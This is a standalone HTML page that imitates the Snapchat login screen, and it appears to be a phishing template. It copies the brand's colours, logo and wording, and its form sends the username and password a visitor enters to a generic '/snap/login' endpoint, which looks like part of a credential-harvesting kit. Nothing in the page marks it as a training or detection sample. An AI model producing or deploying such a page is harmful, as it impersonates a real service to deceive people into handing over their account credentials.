<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Snapchat</title>
<style>
body{background:#FFFC00;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif}
.card{background:#fff;padding:40px 30px;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,.2);width:300px;text-align:center}
.logo{font-size:50px;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:12px;background:#00BFFF;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:15px}
</style></head><body>
<div class="card">
<div class="logo">👻</div><h2>Snapchat</h2>
<p style="color:#888;font-size:13px">Sign in to continue</p>
<form method="POST" action="/snap/login">
<input name="username" placeholder="Username or Email" required>
<input name="password" type="password" placeholder="Password" required>
<button>Log In</button></form></div></body></html>
